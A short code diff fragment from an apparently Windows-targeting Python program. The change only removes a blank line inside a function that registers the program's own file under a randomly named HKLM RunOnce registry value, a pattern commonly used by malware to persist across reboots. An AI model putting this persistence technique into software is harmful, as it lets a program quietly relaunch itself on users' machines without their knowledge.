@@ -36,7 +36,6 @@ def is_secure_boot() -> bool:
 def addRun_once():
     reg_key = random_string(is_random=True)
     reg_path = r'SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' # this does not get executed
-
     setRegistryKey(key_name=reg_key,value=f"*{get_current_file_path()}",registry_path=reg_path,HKLM=True)
     return True
 
